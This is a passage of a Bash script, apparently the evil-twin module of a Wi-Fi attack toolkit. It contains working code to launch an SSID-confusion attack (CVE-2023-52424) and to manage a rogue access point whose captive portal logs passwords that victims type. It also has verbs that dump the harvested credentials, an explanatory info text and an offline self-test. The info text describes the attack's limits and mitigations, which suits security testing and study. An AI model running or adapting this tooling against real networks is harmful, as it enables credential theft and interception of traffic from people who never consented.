et_cli_ssid_confusion() {
    local bssid="$1" real="$2" fake="$3" dur="${4:-120}"
    if [[ -z "$bssid" || -z "$real" || -z "$fake" ]]; then
        printf 'usage: --ssid-confusion BSSID REAL_SSID FAKE_SSID [DURATION]\n' >&2
        return 2
    fi
    if [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        printf 'ERROR\tinvalid BSSID: %s\n' "$bssid" >&2
        return 2
    fi
    if [[ "$real" == "$fake" ]]; then
        printf 'ERROR\tREAL_SSID and FAKE_SSID are identical — there is nothing to confuse\n' >&2
        return 2
    fi
    if [[ ! "$dur" =~ ^[0-9]+$ ]] || (( dur < 1 )); then
        printf 'ERROR\tduration must be a positive integer of seconds, got: %s\n' "$dur" >&2
        return 2
    fi

    et_prepare
    local iface ap mode conn tool
    IFS=$'\t' read -r iface ap mode conn < <(et_ap_iface_report "")
    tool=$(et_find_confusion_tool) || tool=""

    printf 'SSID_CONFUSION\t%s\n' "$bssid"
    printf 'BEACON_SSID\t%s\n'     "$real"
    printf 'ASSOC_SSID\t%s\n'      "$fake"
    printf 'DURATION\t%s\n'        "$dur"
    printf 'IFACE\t%s\n'           "${iface:-}"
    printf 'DAEMON\t%s\n'          "${tool:-none}"

    local confs
    confs=$(et_write_ssid_confusion "$real" "$fake" "${TARGET_CHANNEL:-6}" "${iface:-wlan0}")
    printf '%s\n' "$confs"

    # Emit the generated configs verbatim as the evidence for this verb.
    local line
    while IFS= read -r line; do printf 'FRAGMENT\t%s\n' "$line"; done < "$ET_CONFUSION_CONF"
    while IFS= read -r line; do printf 'FRAGMENT_ASSOC\t%s\n' "$line"; done < "$ET_CONFUSION_ASCONF"

    et_ssid_confusion_plan "$bssid" "$real" "$fake" "$dur" "$iface" "$tool"

    local blockers brc
    blockers=$(et_ssid_confusion_blockers "$iface" "$ap" "$mode" "$conn" "$tool")
    brc=$?
    if (( brc == 0 )); then
        while IFS= read -r line; do
            [[ -n "$line" ]] && printf 'REFUSE\tssid confusion not launched: %s\n' "$line" >&2
        done <<< "$blockers"
        printf 'STATE\trefused\n'
        return 1
    fi

    printf 'LAUNCH\t%s %s\n' "$tool" "$ET_CONFUSION_CONF"
    timeout "$dur" "$tool" "$ET_CONFUSION_CONF"
}

# ── FIXED: teardown restores iface and NetworkManager ──
et_cli_teardown() {
    # Idempotent — safe to call multiple times, safe to call without a running AP.

    [[ -f "$ET_DIR/hostapd.pid" ]] && \
        kill "$(cat "$ET_DIR/hostapd.pid")" 2>/dev/null || true
    [[ -f "$ET_DIR/dnsmasq.pid" ]] && \
        kill "$(cat "$ET_DIR/dnsmasq.pid")" 2>/dev/null || true

    pkill -f "hostapd $ET_CONF"     2>/dev/null || true
    pkill -f "dnsmasq -C $ET_CONF"  2>/dev/null || true
    pkill -f "lighttpd.*$ET_CONF"   2>/dev/null || true
    pkill -f "lighttpd -f $ET_CONF" 2>/dev/null || true

    # Restore firewall state
    iptables -t nat -F 2>/dev/null || true
    iptables -F 2>/dev/null || true
    sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true

    # Restore interface to managed (was the missing piece)
    local iface="${ET_AP_IFACE:-}"
    if [[ -n "$iface" && -e "/sys/class/net/$iface" ]]; then
        ip addr flush dev "$iface" 2>/dev/null || true
        ip link set "$iface" down 2>/dev/null || true
        iw dev "$iface" set type managed 2>/dev/null || true
        ip link set "$iface" up 2>/dev/null || true
    fi

    # Restore NetworkManager
    systemctl start NetworkManager 2>/dev/null || true

    rm -f "$TMP_DIR/eviltwin.pid" \
          "$ET_DIR/hostapd.pid" \
          "$ET_DIR/dnsmasq.pid"
}

et_cli_status_tsv() {
    local running=0
    if [[ -f "$TMP_DIR/eviltwin.pid" ]]; then
        local epid
        epid=$(cat "$TMP_DIR/eviltwin.pid" 2>/dev/null)
        # /proc, NOT kill -0: the launch runs under pkexec as root, and
        # kill -0 returns EPERM for a root-owned process when the caller is
        # not root. That made a live rogue AP report running=0, so the GUI's
        # poll could never see it and sat on "Launching" forever.
        [[ -n "$epid" && -d "/proc/$epid" ]] && running=1
    fi

    # status runs in its own process, so the variables the launcher exported
    # are gone. Fall back to the hostapd config it wrote, or the verb reports
    # an empty iface/ssid/channel for a running AP.
    local cf="$ET_CONF/hostapd.conf"
    if [[ -f "$cf" ]]; then
        [[ -z "${ET_AP_IFACE:-}" ]]    && ET_AP_IFACE=$(awk -F= '/^interface=/{print $2; exit}' "$cf")
        [[ -z "${TARGET_ESSID:-}" ]]   && TARGET_ESSID=$(awk -F= '/^ssid=/{print $2; exit}' "$cf")
        [[ -z "${TARGET_CHANNEL:-}" ]] && TARGET_CHANNEL=$(awk -F= '/^channel=/{print $2; exit}' "$cf")
    fi

    local creds_count=0 last_cred="" password=""
    [[ -f "$ET_LOG/creds.log" && -s "$ET_LOG/creds.log" ]] && \
        creds_count=$(wc -l < "$ET_LOG/creds.log")
    [[ "$creds_count" -gt 0 ]] && \
        last_cred=$(tail -1 "$ET_LOG/creds.log" | cut -d' ' -f2-)
    [[ -f "$ET_DIR/PASSWORD_FOUND.txt" ]] && \
        password=$(cat "$ET_DIR/PASSWORD_FOUND.txt")

    printf 'running\t%s\n'        "$running"
    printf 'iface\t%s\n'          "${ET_AP_IFACE:-}"
    printf 'ssid\t%s\n'           "${TARGET_ESSID:-}"
    printf 'channel\t%s\n'        "${TARGET_CHANNEL:-}"
    printf 'creds_count\t%s\n'    "$creds_count"
    printf 'last_cred\t%s\n'      "$last_cred"
    printf 'password_found\t%s\n' "$password"
    printf 'log_dir\t%s\n'        "$ET_LOG"
}

et_cli_creds_dump() {
    local credlog="$ET_LOG/creds.log"
    local found="$ET_DIR/PASSWORD_FOUND.txt"
    [[ -f "$credlog" ]] && cat "$credlog" 2>/dev/null
    [[ -f "$found" ]] && printf 'VERIFIED\t%s\n' "$(cat "$found")"
}

# ═══════════════════════════════════════════════════════════════════
#  --info
# ═══════════════════════════════════════════════════════════════════
et_info() {
    cat <<'EOF'
Evil twin — rogue AP, captive portal, and SSID confusion

  Evil twin (--launch IFACE SSID CHAN [EXTRA_SSIDS])
    Stands up a rogue AP with the target's SSID plus a captive portal, then
    verifies any password a victim types against the captured handshake. The
    portal password is only useful if you already hold a hash for the target.

  SSID confusion (--ssid-confusion BSSID REAL_SSID FAKE_SSID [DUR])
    CVE-2023-52424 class. IEEE 802.11 does not authenticate the SSID in the
    4-way handshake, so a rogue AP can advertise one network name in its
    beacons while the association and PMK derivation complete against a
    different network.

    This is a CLIENT-SIDE CONFUSION attack. The victim's device (and its
    user) sees REAL_SSID, while the traffic actually goes to the attacker's
    FAKE_SSID network.

    What it DOES achieve
      - the client believes, and displays, that it is on the trusted network
      - a VPN configured to auto-disable on trusted networks turns itself off
      - captive-portal and per-network firewall policy is evaluated against
        the trusted name, so those protections are skipped
      - the client is downgraded onto the attacker's network, where the
        attacker can intercept/forward traffic

    What it does NOT achieve
      - it does not recover, crack or weaken the Wi-Fi password
      - it does not break CCMP/GCMP link encryption
      - it does not defeat PMF/802.11w and is not a deauth or handshake attack
      - it is not a server-side attack: the client does not send credentials
        anywhere because of it
      - it fails if each SSID uses a distinct credential, because the rogue
        BSS must use the same authentication credentials as the network the
        beacon names

    Prerequisites: the victim wants to connect to the trusted network; a
    rogue BSS with the SAME authentication credentials; the attacker in
    range to sit in the middle.

    Mitigations: a unique PSK per SSID; distinct RADIUS server CommonNames;
    beacon protection; and the standards work to bind the SSID into the
    4-way handshake.

    On this machine the config generation, the emitted fragment and the plan
    always work. The launch is refused by name: stock hostapd advertises and
    associates with a single ssid= per BSS and cannot express the mismatch,
    so the patched SSID-confusion build must be installed for it.

  Output is TSV; the generated configs are echoed as FRAGMENT lines.
  Errors go to stderr and the verb returns non-zero.
EOF
}

et_show_logs() {
    echo ""
    echo "  === creds.log ==="
    [[ -f "$ET_LOG/creds.log" ]] && cat "$ET_LOG/creds.log" || echo "  (empty)"
    echo ""
    echo "  === dnsmasq (last 20) ==="
    [[ -f "$ET_LOG/dnsmasq.log" ]] && tail -20 "$ET_LOG/dnsmasq.log" || echo "  (empty)"
    echo ""
    echo "  === lighttpd access (last 20) ==="
    [[ -f "$ET_LOG/lighttpd-access.log" ]] && tail -20 "$ET_LOG/lighttpd-access.log" || echo "  (empty)"
    read -rp "  press enter " _
}

eviltwin_menu() {
    while true; do
        banner 2>/dev/null || clear
        echo "  === evil twin ==="
        echo "  target:    ${TARGET_ESSID:-?} ch ${TARGET_CHANNEL:-?}"
        cat << 'M'

  [1]  launch evil twin (rogue AP + captive portal)
  [2]  teardown / cleanup
  [3]  show logs
  [0]  back

M
        read -rp "  choice> " c
        case "$c" in
            1)
                et_require || continue
                et_pick_ap_iface_interactive || { read -rp "  enter" _; continue; }
                read -rp "  extra SSIDs (comma-separated, blank=none)> " extras
                et_cli_launch "$ET_AP_IFACE" "$TARGET_ESSID" "$TARGET_CHANNEL" "$extras"
                ;;
            2) et_cli_teardown ;;
            3) et_show_logs ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── self-test ────────────────────────────────────────────────────────────
# Offline only: no radio, no root, no network. Every config/portal/state
# path is shadowed into a scratch dir and removed before returning, so the
# real loot/eviltwin and /tmp/wifisting/eviltwin trees are never written.
et_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local st="$TMP_DIR/selftest-$$"
    rm -rf "$st"; mkdir -p "$st/www" "$st/conf" "$st/log"
    local ET_DIR="$st" ET_WWW="$st/www" ET_CONF="$st/conf" \
          ET_STATE="$st/state" ET_LOOT="$st/loot" ET_LOG="$st/log"
    local field
    field() { awk -F= -v k="$2" '$1==k{print $2; exit}' "$1"; }

    # ── hostapd.conf ──
    et_write_hostapd "SelftestNet" "6" "wlan9" >/dev/null
    local hc="$ET_CONF/hostapd.conf"
    chk hostapd-interface "$(field "$hc" interface)" "wlan9"
    chk hostapd-driver    "$(field "$hc" driver)"    "nl80211"
    chk hostapd-ssid      "$(field "$hc" ssid)"      "SelftestNet"
    chk hostapd-channel   "$(field "$hc" channel)"   "6"
    chk hostapd-hwmode    "$(field "$hc" hw_mode)"   "g"
    # Secondary SSIDs: whitespace-padded entries are trimmed, not printed raw.
    local ET_EXTRA_SSIDS="Guest, Cafe "
    et_write_hostapd "SelftestNet" "6" "wlan9" >/dev/null
    chk hostapd-extra-ssids "$(awk -F= '$1=="ssid"{print $2}' "$hc" | paste -sd, -)" "SelftestNet,Guest,Cafe"
    chk hostapd-extra-bss   "$(grep -c '^bss=wlan9' "$hc")" "2"

    # ── dnsmasq.conf ──
    et_write_dnsmasq "wlan9" >/dev/null
    local dc="$ET_CONF/dnsmasq.conf"
    chk dnsmasq-dhcp-range "$(field "$dc" dhcp-range)" "10.0.0.10,10.0.0.100,12h"
    chk dnsmasq-wildcard   "$(grep -c '^address=/#/10.0.0.1$' "$dc")" "1"
    chk dnsmasq-logfile    "$(field "$dc" log-facility)" "$ET_LOG/dnsmasq.log"

    # ── lighttpd.conf: every OS captive-portal probe must be rewritten ──
    et_write_lighttpd >/dev/null
    local lc="$ET_CONF/lighttpd.conf"
    chk lighttpd-docroot      "$(grep -cF "server.document-root = \"$ET_WWW\"" "$lc")" "1"
    chk lighttpd-android      "$(grep -c 'generate_204' "$lc")" "1"
    chk lighttpd-android-gen  "$(grep -c 'gen_204' "$lc")" "1"
    chk lighttpd-windows-ncsi "$(grep -c 'ncsi' "$lc")" "1"
    chk lighttpd-windows-conn "$(grep -c 'connecttest' "$lc")" "1"
    chk lighttpd-apple        "$(grep -c 'hotspot-detect' "$lc")" "2"
    chk lighttpd-rewrites     "$(grep -c '=> "/index.html"' "$lc")" "11"

    # ── captive portal: hostile SSID must survive the render verbatim ──
    local TARGET_ESSID='Bob & Alice <Wi-Fi>'
    et_write_portal >/dev/null
    local idx="$ET_WWW/index.html"
    chk portal-ssid-substituted \
        "$(grep -cF "decodeURIComponent('Bob & Alice <Wi-Fi>')" "$idx")" "1"
    chk portal-placeholder-gone "$(grep -c 'SSID_PLACEHOLDER' "$idx")" "0"
    chk portal-cgi-logpath      "$(grep -cF "$ET_LOG/creds.log" "$ET_WWW/submit.cgi")" "1"
    chk portal-cgi-no-literal   "$(grep -c 'ET_LOG_PATH' "$ET_WWW/submit.cgi")" "0"
    chk portal-cgi-executable   "$([[ -x "$ET_WWW/submit.cgi" ]] && echo yes || echo no)" "yes"

    # ── target state round trip ──
    TARGET_ESSID="RoundTrip"; TARGET_CHANNEL="11"; ET_AP_IFACE="wlan9"
    et_save_state
    unset TARGET_ESSID TARGET_CHANNEL ET_AP_IFACE
    et_load_state
    chk state-essid   "$TARGET_ESSID"   "RoundTrip"
    chk state-channel "$TARGET_CHANNEL" "11"
    chk state-iface   "$ET_AP_IFACE"    "wlan9"

    # ── password verification with no reference must say "unverified" (2) ──
    unset LAST_HASH LAST_HANDSHAKE
    et_verify_password "whatever" >/dev/null 2>&1
    chk verify-no-reference-rc "$?" "2"

    # ── launch argument validation (before any EUID/pkexec branch) ──
    et_cli_launch "" "ssid" "6" >/dev/null 2>&1
    chk launch-missing-iface-rc "$?" "2"
    et_cli_launch "wlan9" "" "6" >/dev/null 2>&1
    chk launch-missing-ssid-rc "$?" "2"

    # ── status / creds dump over a synthetic creds.log ──
    printf '%s\n' "1700000000 hunter2" "1700000001 correct horse" > "$ET_LOG/creds.log"
    printf '%s\n' "correct horse" > "$ET_DIR/PASSWORD_FOUND.txt"
    local stsv; stsv=$(et_cli_status_tsv)
    fld() { printf '%s\n' "$stsv" | awk -F'\t' -v k="$1" '$1==k{print $2}'; }
    # Do NOT assert running=0: whether an AP is up is ambient state, not a
    # property of this code, and the test failed the moment a real hostapd
    # happened to be running. Assert it is a valid flag instead.
    case "$(fld running)" in
        0|1) chk status-running ok ok ;;
        *)   chk status-running "$(fld running)" "0 or 1" ;;
    esac
    # And that the other fields are present rather than left empty, which is
    # what they were while status read them from the launcher's environment.
    chk status-iface-field "$(fld iface | grep -c .)" 1
    chk status-creds-count "$(fld creds_count)"   "2"
    chk status-last-cred   "$(fld last_cred)"     "correct horse"
    chk status-password    "$(fld password_found)" "correct horse"
    chk status-log-dir     "$(fld log_dir)"       "$ET_LOG"
    chk creds-dump "$(et_cli_creds_dump)" \
        "$(printf '%s\n' "1700000000 hunter2" "1700000001 correct horse" $'VERIFIED\tcorrect horse')"

    # ═══════════════════════════════════════════════════════════════
    #  SSID confusion (offline: fragment, plan, gate)
    # ═══════════════════════════════════════════════════════════════
    local ET_CONFUSION_CONF="$st/conf/ssid-confusion.conf" \
          ET_CONFUSION_ASCONF="$st/conf/ssid-confusion-assoc.conf"

    local cfs
    cfs=$(et_write_ssid_confusion "TrustedNet" "WrongNet" "6" "wlan9")
    chk confusion-conf-path \
        "$(printf '%s\n' "$cfs" | awk -F'\t' '$1=="CONF"{print $2}')" "$ET_CONFUSION_CONF"
    chk confusion-assoc-path \
        "$(printf '%s\n' "$cfs" | awk -F'\t' '$1=="ASSOC_CONF"{print $2}')" "$ET_CONFUSION_ASCONF"

    # Beacon side advertises the trusted name...
    chk confusion-beacon-ssid "$(field "$ET_CONFUSION_CONF" ssid)" "TrustedNet"
    chk confusion-channel     "$(field "$ET_CONFUSION_CONF" channel)" "6"
    chk confusion-iface       "$(field "$ET_CONFUSION_CONF" interface)" "wlan9"
    # ...and names the association SSID it must complete against.
    chk confusion-assoc-ssid "$(field "$ET_CONFUSION_CONF" assoc_ssid)" "WrongNet"
    chk confusion-marks-nonstock \
        "$(grep -c 'NOT a stock hostapd directive' "$ET_CONFUSION_CONF")" "1"
    # The association-side config is the one stock hostapd could run, and it
    # must carry the FAKE ssid, exactly once.
    chk confusion-assoc-conf-ssid "$(field "$ET_CONFUSION_ASCONF" ssid)" "WrongNet"
    chk confusion-assoc-conf-ssid-count \
        "$(grep -c '^ssid=' "$ET_CONFUSION_ASCONF")" "1"
    chk confusion-assoc-conf-keeps-iface \
        "$(field "$ET_CONFUSION_ASCONF" interface)" "wlan9"
    # A fake SSID containing sed/awk metacharacters must survive verbatim.
    et_write_ssid_confusion "TrustedNet" 'A&B|C\d' "6" "wlan9" >/dev/null
    chk confusion-fake-metachars \
        "$(field "$ET_CONFUSION_ASCONF" ssid)" 'A&B|C\d'
    chk confusion-fake-metachars-assoc-line \
        "$(field "$ET_CONFUSION_CONF" assoc_ssid)" 'A&B|C\d'

    # ── the gate is a pure function; assert every branch ──
    et_ssid_confusion_blockers "" yes managed no /usr/bin/ssidconf >/dev/null
    chk confusion-block-no-iface-rc "$?" "0"
    et_ssid_confusion_blockers wlp5s0 no managed no /usr/bin/ssidconf >/dev/null
    chk confusion-block-no-apmode-rc "$?" "0"
    local b1 b2 b3 b4
    b1=$(et_ssid_confusion_blockers wlan1 yes managed yes /usr/bin/ssidconf)
    chk confusion-block-connected-rc "$?" "0"
    chk confusion-block-connected-names-live \
        "$(printf '%s' "$b1" | grep -c 'live connection')" "1"
    b2=$(et_ssid_confusion_blockers wlp5s0 yes monitor no /usr/bin/ssidconf)
    chk confusion-block-monitor-rc "$?" "0"
    chk confusion-block-monitor-names-monitor \
        "$(printf '%s' "$b2" | grep -c 'monitor mode')" "1"
    b3=$(et_ssid_confusion_blockers wlan1 yes managed no "")
    chk confusion-block-no-tool-rc "$?" "0"
    chk confusion-block-no-tool-names-stock-hostapd \
        "$(printf '%s' "$b3" | grep -c 'stock hostapd')" "1"
    # Both blockers at once must both be reported, not just the first.
    b4=$(et_ssid_confusion_blockers wlp5s0 yes monitor no "")
    chk confusion-block-reports-all \
        "$(printf '%s' "$b4" | grep -c .)" "2"
    et_ssid_confusion_blockers wlan1 yes managed no /usr/bin/ssidconf >/dev/null
    chk confusion-allow-when-clear-rc "$?" "1"

    # ── plan + argument validation ──
    local cplan
    cplan=$(et_ssid_confusion_plan "aa:bb:cc:dd:ee:ff" "TrustedNet" "WrongNet" 120 wlan1 /usr/bin/ssidconf)
    cpf() { printf '%s\n' "$cplan" | awk -F'\t' -v k="$1" '$2==k{print $3; exit}'; }
    chk confusion-plan-verb  "$(cpf verb)" "--ssid-confusion"
    chk confusion-plan-real  "$(cpf beacon_ssid)" "TrustedNet"
    chk confusion-plan-fake  "$(cpf assoc_ssid)"  "WrongNet"
    chk confusion-plan-class "$(cpf class | grep -c 'CVE-2023-52424')" "1"
    chk confusion-plan-tsv   "$(printf '%s\n' "$cplan" | awk -F'\t' 'NF!=3{n++} END{print n+0}')" "0"
    chk confusion-plan-honesty "$(cpf honesty | grep -c 'does not recover the password')" "1"

    et_cli_ssid_confusion "" "a" "b" >/dev/null 2>&1
    chk confusion-usage-rc "$?" "2"
    et_cli_ssid_confusion "not-a-mac" "a" "b" >/dev/null 2>&1
    chk confusion-bad-bssid-rc "$?" "2"
    et_cli_ssid_confusion "aa:bb:cc:dd:ee:ff" "Same" "Same" >/dev/null 2>&1
    chk confusion-same-ssid-rc "$?" "2"
    et_cli_ssid_confusion "aa:bb:cc:dd:ee:ff" "a" "b" "soon" >/dev/null 2>&1
    chk confusion-bad-duration-rc "$?" "2"
    et_cli_ssid_confusion "aa:bb:cc:dd:ee:ff" "a" "b" "0" >/dev/null 2>&1
    chk confusion-zero-duration-rc "$?" "2"

    # --info must be precise about the class of attack.
    local ei
    ei=$(et_info)
    chk info-ssid-confusion "$(printf '%s' "$ei" | grep -c -- '--ssid-confusion')" "1"
    chk info-cve            "$(printf '%s' "$ei" | grep -c 'CVE-2023-52424')" "1"
    chk info-client-side    "$(printf '%s' "$ei" | grep -c 'CLIENT-SIDE CONFUSION')" "1"
    chk info-does-not-crack "$(printf '%s' "$ei" | grep -c 'does not recover, crack or weaken')" "1"
    chk info-not-pmf        "$(printf '%s' "$ei" | grep -c 'does not defeat PMF')" "1"
    chk info-prereq         "$(printf '%s' "$ei" | grep -c 'SAME authentication credentials')" "1"

    rm -rf "$st"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

et_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --list-ap-ifaces-tsv) et_cli_list_ap_ifaces_tsv ;;
        --status-tsv)         et_cli_status_tsv ;;
        --diagnose)           et_cli_diagnose ;;
        --launch)             et_cli_launch "$@" ;;
        --privileged-launch)  et_launch_privileged "$@" ;;
        --teardown)           et_cli_teardown ;;
        --creds-dump)         et_cli_creds_dump ;;
        --ssid-confusion)     et_cli_ssid_confusion "$@" ;;
        --info)               et_info ;;
        --selftest)           et_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --list-ap-ifaces-tsv
  --status-tsv
  --launch IFACE SSID CHAN [EXTRA_SSIDS]
  --teardown
  --creds-dump
  --ssid-confusion BSSID REAL_SSID FAKE_SSID [DURATION]
  --info
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    et_prepare
    et_cli_main "$@"
fi
